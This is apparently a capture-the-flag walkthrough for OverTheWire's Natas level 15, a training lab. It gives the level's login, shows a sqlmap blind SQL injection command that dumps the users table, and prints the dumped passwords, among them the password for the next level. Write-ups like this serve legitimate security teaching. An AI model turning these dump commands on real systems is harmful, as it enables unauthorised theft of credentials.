# Natas Level 15
The ***URL*** to which you need to connect is *http://natas15.natas.labs.overthewire.org*. The ***username*** is *natas15* and the ***password*** is *AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J*. 

Lets check the [viewsource](http://natas15.natas.labs.overthewire.org/index-source.html) link.
Lets test some user that we know: admin, natas15, natas16 ...

So we found that natas16 is one of the users in the sql table lets try to use [SQLMap](http://sqlmap.org/). Here's a [cheat sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet) to the tool. 

```
python sqlmap.py -u "http://natas15.natas.labs.overthewire.org" --technique=B --string="This user exists" --auth-type=Basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data "username=natas16" -D natas15 -T users -C username,password --dump --level=5 --risk=3
```
Or
```
sqlmap -u "http://natas15.natas.labs.overthewire.org" --technique=B --string="This user exists" --auth-type=Basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data "username=natas16" -D natas15 -T users -C username,password --dump --level=5 --risk=3
```
```
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| bob      | 6P151OntQe                       |
| charlie  | HLwuGKts2w                       |
| alice    | hROtsfM734                       |
| natas16  | WaIHEacj63wnNIBROHeqi3p9t0m5nhmh |
+----------+----------------------------------+
```
